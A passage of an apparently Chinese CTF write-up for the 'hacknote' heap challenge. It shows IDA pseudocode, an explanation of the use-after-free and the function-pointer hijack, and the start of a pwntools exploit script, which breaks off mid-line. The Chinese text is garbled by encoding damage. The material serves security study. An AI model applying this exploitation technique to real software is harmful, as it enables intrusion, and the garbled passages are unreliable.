standards).</p><blockquote><p>main_arenaÊòØ‰∏çËÉΩÂØºÂá∫ÁöÑ‰∏Ä‰∏™Êú¨Âú∞Á¨¶Âè∑Ë°®„ÄÇÂØºÂá∫Á¨¶Âè∑ÂàóË°®ÈúÄË¶ÅÈÄöËøáglibcÊ∫ê‰ª£Á†ÅÁõÆÂΩï‰∏≠ÁöÑVersionÊñá‰ª∂ÊéßÂà∂„ÄÇËøôÊòØËÆæËÆ°Áî®‰∫éÈò≤Ê≠¢‰∫∫‰ª¨ÈìæÊé•glibcÂÜÖÈÉ®‰ΩøÁî®ÁöÑÈöèÊú∫Á¨¶Âè∑ÔºåÔºàÊâÄ‰ª•‰∏ç‰ºöÂÉèPOSIXÂíåÂÖ∂‰ªñÊ†áÂáÜÈÇ£Ê†∑Ê±°ÊüìÂëΩÂêçÁ©∫Èó¥Ôºâ„ÄÇ</p></blockquote><p>gdb can find it because you have debug symbols available ‚Ä¶ either the C lib is not stripped, or you have the split debug symbols in <code>/usr/lib/debug/</code> and gdb is finding those. when you launch gdb, it will tell you things like <code>Reading symbols from /usr/lib/debug/xxxxx</code>.</p><blockquote><p>gdbÂèØ‰ª•ÊâæÂà∞main_arenaÔºåÂõ†‰∏∫‰Ω†ÂèØ‰ª•Ëé∑Âæó‰∏Ä‰∫õË∞ÉËØïÁ¨¶Âè∑Ë°®‚Ä¶ÂΩìÁ®ãÂ∫èÊ≤°ÊúâË¢´ËÑ±Ë°£Êúç(not stripped)ÔºåÊàñËÄÖ‰Ω†Âú®<code>/ usr / lib / debug /</code>‰∏≠ÊãÜÂàÜËøáË∞ÉËØïÁ¨¶Âè∑ÔºåËÄågdbÂèØ‰ª•ÊâæÂà∞ÂÆÉ‰ª¨„ÄÇÂΩì‰Ω†ÂêØÂä®gdbËøõË°åË∞ÉËØïÊó∂ÔºåÂÆÉ‰ºöÊòæÁ§∫Ë∞ÉËØï‰ø°ÊÅØÔºå‰æãÂ¶Ç<code>loading symbols from / usr / lib / debug / xxxxx</code>ËøôÁßçË∞ÉËØï‰ø°ÊÅØ„ÄÇ</p></blockquote><p>the only way to be able to link against the symbol is to rebuild glibc from source and modify the export list.</p><blockquote><p>ÂîØ‰∏ÄËÉΩÂ§üÈìæÊé•Âà∞Á¨¶Âè∑ÁöÑÊñπÊ≥ïÊòØ‰ªéÊ∫êÈáçÊûÑGLIBCÂπ∂‰øÆÊîπÂØºÂá∫ÂàóË°®„ÄÇ</p></blockquote><p>alternatively, you could write some code in your app to behave like gdb. namely, open the debug file, process the ELF/DWARF information in it, apply relocations using the active loaded library info (see <code>dl_iterate_phdr</code>), and then just start poking memory directly.</p><blockquote><p>ÊàñËÄÖÔºå‰Ω†ÂèØ‰ª•Âú®‰Ω†ÁöÑÂ∫îÁî®Á®ãÂ∫è‰∏≠ÁºñÂÜô‰∏Ä‰∫õ‰ª£Á†ÅÊù•ÂÉègdbË∞ÉËØï‰∏ÄÊ†∑„ÄÇÂç≥ÈÄöËøáÂ∫îÁî®Á®ãÂ∫èÔºåÊâìÂºÄË∞ÉËØïÊñá‰ª∂ÔºåÂ§ÑÁêÜÂÖ∂‰∏≠ÁöÑELF / DWARF‰ø°ÊÅØÔºå‰ΩøÁî®Ê¥ªÂä®Âä†ËΩΩÁöÑÂ∫ì‰ø°ÊÅØÂ∫îÁî®ÈáçÂÆö‰ΩçÔºàËØ∑ÂèÇÈòÖdl_iterate_phdrÔºâÔºåÁÑ∂ÂêéÁõ¥Êé•ÂºÄÂßãË∞ÉÁî®ÂÜÖÂ≠ò„ÄÇ</p></blockquote><p>if that‚Äôs too much work, a hackery solution might be to <code>fork()</code>+<code>popen()</code> gdb against your own process and run it in batch mode to dump symbol info.</p><blockquote><p>Â¶ÇÊûúÈÇ£Â§™Ëøá‰∫éÈ∫ªÁÉ¶ÔºåÈªëÂÆ¢‰∏ÄÁÇπÁöÑËß£ÂÜ≥ÊñπÊ°àÂèØËÉΩÊòØ<code>forkÔºàÔºâ+ popenÔºàÔºâ</code>gdbË∞ÉËØï‰Ω†Ëá™Â∑±ÁöÑËøõÁ®ãÔºåÂπ∂‰ª•ÊâπÂ§ÑÁêÜÊ®°ÂºèËøêË°åÂÆÉÊù•ËΩ¨ÂÇ®Á¨¶Âè∑‰ø°ÊÅØ„ÄÇ</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token function">asprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cmd<span class="token punctuation">,</span> <span class="token string">"gdb -q -p %i -batch -ex 'p &amp;main_arena'"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// parse the output of |fp| here looking for the address.</span><span class="token function">free</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h3 id="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"><a href="#Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ" class="headerlink" title="Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ"></a>Ê£ÄÊü•‰øùÊä§Êé™ÊñΩ</h3><blockquote><p>ÈÇ£‰πàÂºÄÂßãÂÅöÈ¢òÂêßÔºåÂÖàchecksec:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203217.png" alt=""></p><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÂºÄÂêØ‰∫ÜÊ†àÊ∫¢Âá∫‰øùÊä§‰ª•ÂèäÊ†à‰∏çÂèØÊâßË°åÔºåÈÇ£‰πàËøôÈ¢òÂæàÊòéÊòæÂ∞±ÊòØËÆ©Êàë‰ª¨‰ªéÂà´ÁöÑÂú∞ÊñπÂÖ•Êâã„ÄÇ</p></blockquote><h3 id="ÈÄªËæëÂàÜÊûê"><a href="#ÈÄªËæëÂàÜÊûê" class="headerlink" title="ÈÄªËæëÂàÜÊûê"></a>ÈÄªËæëÂàÜÊûê</h3><blockquote><p>ÂÖàÁÆÄÂçïËøêË°å‰∏Ä‰∏ãÁ®ãÂ∫èÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102203545.png" class="lazyload"></p><p>ËøôÁßçnoteÁ±ªÈ¢òÁõÆÂèØ‰ª•ËØ¥ÊòØÊØîËæÉÂ∏∏ËßÅ‰∫Ü„ÄÇ„ÄÇ„ÄÇÂç≥‰ΩøÊàë‰∏çÊòØpwnÂ∏àÂÇÖÔºåÊàë‰πüÈÅáÂà∞ËøáÂæàÂ§öÊ¨°ÔºåÂΩìÁÑ∂ÊòØ‰∏ÄËÑ∏ÊáµÈÄº‰∫ÜÔºåüò≠„ÄÇ</p></blockquote><p>ÈÄöËøáIDAÈùôÊÄÅÂàÜÊûêmainÂáΩÊï∞ÔºåÂèØ‰ª•ÂæóÂà∞‰∏ãÈù¢ÁöÑ‰º™C‰ª£Á†ÅÔºö</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//mainÂáΩÊï∞</span><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//ËèúÂçï</span>      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Âà†Èô§ÊåáÂÆöÂØπË±°</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ÊâìÂç∞ÂØπË±°</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_13<span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Ê∑ªÂä†note</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ÁúãÁúãaddÂáΩÊï∞Ôºö</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_note</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ÂÖà‰∏∫notelistÁî≥ËØ∑8Â§ßÂ∞èÁöÑÁ©∫Èó¥</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ÂÜç‰∏∫ËæìÂÖ•ÁöÑÂÜÖÂÆπÔºàcontentÔºâÁî≥ËØ∑Á©∫Èó¥</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ËØªÂèñÂÜÖÂÆπ</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>count<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>deleteÂáΩÊï∞:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ÂÖàfreeÊéâcontent</span>    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//ÂÜçfreeËá™Â∑±</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>print_note:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ËøòÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∏™<code>magicÔºàaddr = 0x08048986)</code>ÂáΩÊï∞ÔºåËÄåËøô‰∏™ÂáΩÊï∞Â∞±ÊòØÊàë‰ª¨ÁöÑÁõÆÊ†áÂì¶Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102205533.png" class="lazyload"></p><blockquote><p> Ëß£È¢òÈÄªËæëÔºöÈÄöËøá‰∏äÈù¢ÂØπfastbinÔºåuafÁöÑ‰∫ÜËß£ÂêéÔºåÂ§ßÊ¶ÇÂèØ‰ª•ÁêÜËß£Ëøô‰∏™È¢òÁõÆÁöÑËß£È¢òÊñπÊ≥ï‰∫Ü„ÄÇÊàë‰ª¨È¶ñÂÖàË¶ÅÊòéÁôΩmallocÂíåfreeÊú∫Âà∂ÔºåÂÖàË¢´freeÊéâÁöÑÂùó‰ºöÂæàÂø´Ë¢´Â∫îÁî®‰∫éÊñ∞ÁöÑmallocÔºåÂâçÊèêÊòØÂ§ßÂ∞èÂêàÈÄÇÔºå‰æãÂ¶Ç<code>free v1; v2 = malloc(4)</code>ÔºåÂ¶ÇÊûúÂéüÊù•v1ÁöÑÂ§ßÂ∞è‰πü‰∏∫4ÔºåÈÇ£‰πàv1ÂéüÊù•ÁöÑÈÇ£ÂùóÂÜÖÂ≠òÂ∞±‰ºöË¢´ÂàÜÈÖçÁªôv2ÔºåÈÄöËøáv1ÂèØ‰ª•ÔºàuafÔºâËÆøÈóÆv2ÁöÑÂÜÖÂÆπ„ÄÇ</p><p>FÔºåAÔºåUÔºàÂÖàFREE,ÂÜç‰øÆÊîπchunkÔºåË∞ÉÁî®chunk‰∏≠ÁöÑÂáΩÊï∞ÊåáÈíàÔºâ„ÄÇËÆ©‰∏§‰∏™ÊåáÈíàÂÆûÈôÖÊåáÂêëÂêå‰∏Ä‰∏™chunkÔºå‰∏Ä‰∏™ÊåáÈíàÊääÂÜÖÂ≠òËß£Èáä‰∏∫Â≠óÁ¨¶‰∏≤Ôºå‰ªéËÄåÂÜôÂÖ•‰ªªÊÑèÂÄºÔºåÂè¶‰∏Ä‰∏™ÊåáÈíàÊääÂÜÖÂ≠òËß£Èáä‰∏∫ÂáΩÊï∞ÊåáÈíàÔºå‰ªéËÄåÊéßÂà∂‰∫ÜEIP„ÄÇ</p></blockquote><h3 id="ÊûÑÈÄ†EXP"><a href="#ÊûÑÈÄ†EXP" class="headerlink" title="ÊûÑÈÄ†EXP"></a>ÊûÑÈÄ†EXP</h3><p>ÂÄüÈâ¥veritas501Â∏àÂÇÖÁöÑEXPÔºåÁ®çÂä†‰øÆÊîπÂíåÁêÜËß£Ôºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>bin <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#Ê∑ªÂä†</span><span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#Âà†Èô§‚Äî‚Äîfree</span><span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#ÊâìÂç∞</span><span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token 